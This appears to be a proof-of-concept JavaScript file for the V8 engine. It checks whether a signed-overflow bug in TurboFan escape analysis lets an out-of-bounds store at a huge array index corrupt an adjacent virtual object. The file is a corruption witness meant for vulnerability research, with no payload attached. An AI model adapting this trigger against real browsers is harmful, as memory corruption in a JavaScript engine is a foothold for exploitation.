// PoC 2: Escape Analysis — Store-side variant of the overflow
// Same bug as PoC 1 but exercises the kStoreElement path.
// If the overflow maps the large index to offset -8, and FieldAt() returns
// field[-1] (i.e., the ZoneVector slot BEFORE the allocation), a store
// at the large index could silently corrupt an adjacent virtual object's
// field. Observable: a DIFFERENT variable in the same function has its
// value unexpectedly changed after the bogus store.
//
// Strategy: CORRUPTION WITNESS
//   Two virtual allocations in the same function.
//   If the OOB store from arr1 hits arr0's zone slot, arr0's value changes.
//
// Flags: --allow-natives-syntax

"use strict";

const OVERFLOW_IDX = 268435456;

function witness() {
  const arr0 = ["SAFE"];                // allocation #1 (zone-adjacent to arr1)
  const arr1 = ["X", "Y"];             // allocation #2 — OOB store target
  arr1[OVERFLOW_IDX] = "CORRUPTED";    // StoreElement with overflow index
  // If OOB store hit arr0's zone slot, arr0[0] might now be "CORRUPTED"
  return arr0[0];
}

// Interpreter reference
%NeverOptimizeFunction(witness);
const safe_val = witness();
print("Interpreter arr0[0] = " + safe_val + "  (expected: SAFE)");

// Optimised
function witness_opt() {
  const arr0 = ["SAFE"];
  const arr1 = ["X", "Y"];
  arr1[OVERFLOW_IDX] = "CORRUPTED";
  return arr0[0];
}

for (let i = 0; i < 1000; i++) witness_opt();
%OptimizeFunctionOnNextCall(witness_opt);
const opt_val = witness_opt();
print("Turbofan   arr0[0] = " + opt_val + "  (expected: SAFE)");

if (opt_val !== "SAFE") {
  print("");
  print("!!! CORRUPTION WITNESS TRIGGERED — adjacent virtual object corrupted !!!");
  print("    Got: '" + opt_val + "' instead of 'SAFE'.");
  print("    OOB store through escape-analysis signed-overflow is CONFIRMED.");
} else {
  print("No corruption observed for this allocation layout.");
}
